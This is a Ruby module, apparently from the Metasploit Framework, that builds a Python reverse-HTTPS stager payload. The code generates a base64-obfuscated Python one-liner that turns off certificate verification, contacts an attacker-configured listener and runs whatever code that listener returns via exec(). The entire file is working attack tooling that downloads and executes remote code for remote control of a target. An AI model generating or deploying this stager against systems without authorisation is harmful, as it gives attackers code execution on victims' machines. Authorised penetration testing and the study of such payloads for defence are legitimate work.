##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/handler/reverse_https'

module Metasploit3

  CachedSize = 742

  include Msf::Payload::Stager

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Python Reverse HTTPS Stager',
      'Description'   => 'Tunnel communication over HTTP using SSL',
      'Author'        => 'Spencer McIntyre',
      'License'       => MSF_LICENSE,
      'Platform'      => 'python',
      'Arch'          => ARCH_PYTHON,
      'Handler'       => Msf::Handler::ReverseHttps,
      'Stager'        => {'Payload' => ""}
    ))

    register_options(
      [
        OptString.new('PayloadProxyHost', [false, "The proxy server's IP address"]),
        OptPort.new('PayloadProxyPort', [true, "The proxy port to connect to", 8080 ])
      ], self.class)
  end

  #
  # Constructs the payload
  #
  def generate
    lhost = datastore['LHOST'] || '127.127.127.127'

    var_escape = lambda { |txt|
      txt.gsub('\\', '\\'*4).gsub('\'', %q(\\\'))
    }

    if Rex::Socket.is_ipv6?(lhost)
      target_url = "https://[#{lhost}]"
    else
      target_url = "https://#{lhost}"
    end

    target_url << ':'
    target_url << datastore['LPORT'].to_s
    target_url << '/'
    target_url << generate_callback_uri

    proxy_host = datastore['PayloadProxyHost'].to_s
    proxy_port = datastore['PayloadProxyPort'].to_i

    if proxy_host == ''
      urllib_fromlist = "['HTTPSHandler','build_opener']"
    else
      urllib_fromlist = "['HTTPSHandler','ProxyHandler','build_opener']"
    end

    cmd  = "import sys\n"
    cmd << "vi=sys.version_info\n"
    cmd << "ul=__import__({2:'urllib2',3:'urllib.request'}[vi[0]],fromlist=#{urllib_fromlist})\n"
    cmd << "hs=[]\n"
    # Context added to HTTPSHandler in 2.7.9 and 3.4.3
    cmd << "if (vi[0]==2 and vi>=(2,7,9)) or vi>=(3,4,3):\n"
    cmd << "\timport ssl\n"
    cmd << "\tsc=ssl.SSLContext(ssl.PROTOCOL_SSLv23)\n"
    cmd << "\tsc.check_hostname=False\n"
    cmd << "\tsc.verify_mode=ssl.CERT_NONE\n"
    cmd << "\ths.append(ul.HTTPSHandler(0,sc))\n"

    if proxy_host != ''
      proxy_url = Rex::Socket.is_ipv6?(proxy_host) ?
        "http://[#{proxy_host}]:#{proxy_port}" :
        "http://#{proxy_host}:#{proxy_port}"
      cmd << "hs.append(ul.ProxyHandler({'https':'#{var_escape.call(proxy_url)}'}))\n"
    end

    cmd << "o=ul.build_opener(*hs)\n"
    cmd << "o.addheaders=[('User-Agent','#{var_escape.call(datastore['MeterpreterUserAgent'])}')]\n"
    cmd << "exec(o.open('#{target_url}').read())\n"

    # Base64 encoding is required in order to handle Python's formatting requirements in the while loop
    b64_stub  = "import base64,sys;exec(base64.b64decode("
    b64_stub << "{2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]]('"
    b64_stub << Rex::Text.encode_base64(cmd)
    b64_stub << "')))"
    return b64_stub
  end

  #
  # Determine the maximum amount of space required for the features requested
  #
  def required_space
    # Start with our cached default generated size
    space = cached_size

    # Add 100 bytes for the encoder to have some room
    space += 100

    # Make room for the maximum possible URL length
    space += 256

    # The final estimated size
    space
  end

  #
  # Return the longest URL that fits into our available space
  #
  def generate_callback_uri
    uri_req_len = 30 + rand(256-30)

    # Generate the short default URL if we don't have enough space
    if self.available_space.nil? || required_space > self.available_space
      uri_req_len = 5
    end

    generate_uri_checksum(Msf::Handler::ReverseHttp::URI_CHECKSUM_INITP, uri_req_len)
  end

end
